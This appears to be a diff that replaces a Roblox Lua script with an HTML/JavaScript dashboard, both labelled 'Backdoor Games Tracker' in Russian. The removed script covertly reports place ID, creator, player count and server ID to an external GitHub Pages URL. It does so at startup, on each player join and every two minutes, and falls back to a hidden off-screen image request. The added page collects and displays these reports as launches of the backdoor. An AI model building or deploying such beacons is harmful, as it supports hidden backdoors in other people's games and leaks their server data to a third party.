@@ -1,110 +1,298 @@
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local Players = game:GetService("Players")
-
--- ЗАМЕНИ НА СВОЙ REAL URL!
-local GITHUB_URL = "https://ТВОЙ_НИК.github.io/roblox-tracker/"
-
-local function getGameInfo()
-    local placeId = game.PlaceId
-    
-    local success, gameInfo = pcall(function()
-        return MarketplaceService:GetProductInfo(placeId)
-    end)
-    
-    if success then
-        return {
-            name = gameInfo.Name,
-            placeId = placeId,
-            creator = gameInfo.Creator.Name,
-            players = #Players:GetPlayers(),
-            timestamp = os.time(),
-            serverId = game.JobId
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Backdoor Games Tracker</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    else
-        return {
-            name = "Unknown Game",
-            placeId = placeId,
-            creator = "Unknown",
-            players = #Players:GetPlayers(),
-            timestamp = os.time(),
-            serverId = game.JobId
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
         }
-    end
-end
-
-local function sendToTracker()
-    local gameData = getGameInfo()
-    
-    print("🎮 Backdoor Tracker - Отправка данных:")
-    print("Игра:", gameData.name)
-    print("PlaceId:", gameData.placeId)
-    print("Игроков:", gameData.players)
-    
-    -- Подготовка данных
-    local jsonData = HttpService:JSONEncode(gameData)
-    local encodedData = HttpService:UrlEncode(jsonData)
-    local trackingUrl = GITHUB_URL .. "?data=" .. encodedData .. "&t=" .. os.time()
-    
-    print("📡 URL:", string.sub(trackingUrl, 1, 100) .. "...")
-    
-    -- Метод 1: GET запрос
-    local success, result = pcall(function()
-        return HttpService:GetAsync(trackingUrl)
-    end)
-    
-    if success then
-        print("✅ GET запрос успешен!")
-        return true
-    end
-    
-    print("❌ GET не сработал, пробуем Image метод...")
-    
-    -- Метод 2: Image method
-    local success2 = pcall(function()
-        local gui = Instance.new("ScreenGui")
-        local img = Instance.new("ImageLabel")
         
-        gui.Name = "TrackerGui"
-        gui.Parent = game:GetService("CoreGui")
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
         
-        img.Size = UDim2.new(0, 1, 0, 1)
-        img.Position = UDim2.new(0, -100, 0, -100)
-        img.BackgroundTransparency = 1
-        img.Image = trackingUrl
-        img.Parent = gui
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
         
-        wait(0.5)
-        gui:Destroy()
-    end)
-    
-    if success2 then
-        print("✅ Image метод успешен!")
-        return true
-    end
-    
-    print("💥 Оба метода не сработали")
-    return false
-end
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #4cc9f0;
+        }
+        
+        .games-grid {
+            display: grid;
+            gap: 15px;
+        }
+        
+        .game-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #4cc9f0;
+            backdrop-filter: blur(5px);
+            transition: transform 0.3s ease;
+        }
+        
+        .game-card:hover {
+            transform: translateY(-2px);
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .game-name {
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #4cc9f0;
+        }
+        
+        .game-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+        
+        .last-update {
+            text-align: center;
+            margin-top: 20px;
+            opacity: 0.7;
+            font-size: 0.9em;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            opacity: 0.7;
+        }
+        
+        .log {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 0.8em;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎮 Backdoor Games Tracker</h1>
+            <p>Отслеживание запусков бэкдора</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalGames">0</div>
+                <div>Всего игр</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalLaunches">0</div>
+                <div>Всего запусков</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="uniqueGames">0</div>
+                <div>Уникальных игр</div>
+            </div>
+        </div>
+        
+        <div id="gamesList" class="games-grid">
+            <div class="empty-state" id="emptyState">
+                Ожидание данных от Roblox...
+                <div class="log" id="connectionLog"></div>
+            </div>
+        </div>
+        
+        <div class="last-update">
+            Последнее обновление: <span id="lastUpdate">-</span>
+        </div>
+    </div>
 
--- Основной код
-print("=== Backdoor Games Tracker ===")
-print("Ожидание 3 секунды...")
-wait(3)
-
--- Первый запуск
-sendToTracker()
-
--- При подключении игроков
-Players.PlayerAdded:Connect(function(player)
-    print("👤 Игрок присоединился:", player.Name)
-    wait(5)
-    sendToTracker()
-end)
-
--- Каждые 2 минуты
-while true do
-    wait(120)
-    print("🕐 Периодическая отправка...")
-    sendToTracker()
-end
+    <script>
+        class BackdoorTracker {
+            constructor() {
+                this.games = JSON.parse(localStorage.getItem('backdoorGames') || '[]');
+                this.init();
+            }
+            
+            init() {
+                this.log('🔧 Инициализация трекера...');
+                this.handleIncomingData();
+                this.updateUI();
+                
+                // Проверяем новые данные каждую секунду
+                setInterval(() => {
+                    this.handleIncomingData();
+                    this.updateUI();
+                }, 1000);
+                
+                this.log('✅ Трекер готов к приему данных');
+            }
+            
+            handleIncomingData() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const dataParam = urlParams.get('data');
+                
+                if (dataParam) {
+                    try {
+                        this.log('📨 Получены данные из URL');
+                        const gameData = JSON.parse(decodeURIComponent(dataParam));
+                        this.addGame(gameData);
+                        
+                        // Очищаем URL чтобы не дублировать запросы
+                        window.history.replaceState({}, '', window.location.pathname);
+                        
+                        this.log('✅ Данные успешно обработаны');
+                    } catch (e) {
+                        this.log('❌ Ошибка парсинга: ' + e.message);
+                    }
+                }
+            }
+            
+            addGame(newGame) {
+                const existingIndex = this.games.findIndex(g => g.placeId === newGame.placeId);
+                const now = new Date().toISOString();
+                
+                if (existingIndex !== -1) {
+                    // Обновляем существующую игру
+                    this.games[existingIndex] = {
+                        ...this.games[existingIndex],
+                        ...newGame,
+                        lastSeen: now,
+                        seenCount: (this.games[existingIndex].seenCount || 1) + 1,
+                        lastPlayers: newGame.players,
+                        lastServerId: newGame.serverId
+                    };
+                    this.log('🔄 Обновлена игра: ' + newGame.name);
+                } else {
+                    // Добавляем новую игру
+                    this.games.push({
+                        ...newGame,
+                        firstSeen: now,
+                        lastSeen: now,
+                        seenCount: 1,
+                        lastPlayers: newGame.players,
+                        lastServerId: newGame.serverId
+                    });
+                    this.log('🎮 Новая игра добавлена: ' + newGame.name);
+                }
+                
+                this.saveData();
+            }
+            
+            saveData() {
+                try {
+                    localStorage.setItem('backdoorGames', JSON.stringify(this.games));
+                    this.log('💾 Данные сохранены в localStorage');
+                } catch (e) {
+                    this.log('❌ Ошибка сохранения: ' + e.message);
+                }
+            }
+            
+            updateUI() {
+                const gamesList = document.getElementById('gamesList');
+                const emptyState = document.getElementById('emptyState');
+                const totalGames = document.getElementById('totalGames');
+                const totalLaunches = document.getElementById('totalLaunches');
+                const uniqueGames = document.getElementById('uniqueGames');
+                const lastUpdate = document.getElementById('lastUpdate');
+                
+                // Статистика
+                const launches = this.games.reduce((sum, game) => sum + (game.seenCount || 1), 0);
+                totalGames.textContent = this.games.length;
+                totalLaunches.textContent = launches;
+                uniqueGames.textContent = this.games.length;
+                lastUpdate.textContent = new Date().toLocaleString();
+                
+                // Список игр
+                if (this.games.length === 0) {
+                    emptyState.style.display = 'block';
+                    gamesList.innerHTML = '';
+                    gamesList.appendChild(emptyState);
+                } else {
+                    emptyState.style.display = 'none';
+                    
+                    const sortedGames = [...this.games].sort((a, b) => 
+                        new Date(b.lastSeen) - new Date(a.lastSeen)
+                    );
+                    
+                    gamesList.innerHTML = sortedGames.map(game => `
+                        <div class="game-card">
+                            <div class="game-name">${this.escapeHtml(game.name)}</div>
+                            <div class="game-info">
+                                <div><strong>Place ID:</strong> ${game.placeId}</div>
+                                <div><strong>Создатель:</strong> ${this.escapeHtml(game.creator)}</div>
+                                <div><strong>Игроков:</strong> ${game.lastPlayers || game.players || 0}</div>
+                                <div><strong>Запусков:</strong> ${game.seenCount || 1}</div>
+                                <div><strong>Server ID:</strong> ${game.lastServerId || game.serverId || 'N/A'}</div>
+                                <div><strong>Первый запуск:</strong> ${new Date(game.firstSeen).toLocaleDateString()}</div>
+                                <div><strong>Последний запуск:</strong> ${new Date(game.lastSeen).toLocaleString()}</div>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            }
+            
+            log(message) {
+                const logElement = document.getElementById('connectionLog');
+                if (logElement) {
+                    const timestamp = new Date().toLocaleTimeString();
+                    logElement.innerHTML += `[${timestamp}] ${message}<br>`;
+                    logElement.scrollTop = logElement.scrollHeight;
+                }
+                console.log(message);
+            }
+            
+            escapeHtml(text) {
+                if (!text) return 'Unknown';
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+        }
+        
+        // Запускаем трекер при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            window.tracker = new BackdoorTracker();
+        });
+    </script>
+</body>
+</html>
